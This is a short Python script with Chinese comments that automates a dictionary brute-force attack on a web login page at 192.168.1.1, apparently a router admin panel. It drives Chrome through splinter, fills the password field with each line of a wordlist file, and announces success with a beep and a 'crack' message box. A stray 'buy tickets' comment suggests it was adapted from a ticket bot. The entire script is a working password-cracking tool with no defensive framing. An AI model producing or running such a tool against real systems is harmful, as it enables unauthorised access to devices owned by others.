from splinter.browser import Browser
from time import sleep
#traceback模块 跟踪异常返回信息
import traceback
#ConfigParser模块 读取配置文件
import configparser
import string, os, sys
import notify


# 读取配置文件
#cf = configparser.ConfigParser() 
#cf.read("app.conf")

# 读取字典
f=open("dict.txt")


#设定网址

url ='http://192.168.1.1/'
#cf.get("site", "ticket_url") 



#购票

def crack():
    global b
#使用splinter打开chrome浏览器
    b = Browser(driver_name="chrome")
    b.visit(url)
    try:
        count = 0
        while b.url == url:
            pwd=f.readline().strip()
            print (pwd);
            if not pwd:
                print ('字典已比对完。')
                break
            b.fill('password',pwd);
            b.find_by_id(u"loginSub").click();
            count +=1
            print (u"循环破解... 第 %s 次" % count)

        notify.Beep(300, 3000);
        notify.MessageBoxW('破解','搞定了')
        print  (u"快看 啊")
    except Exception as e:
        print(traceback.print_exc())
if __name__ == "__main__":
    crack()


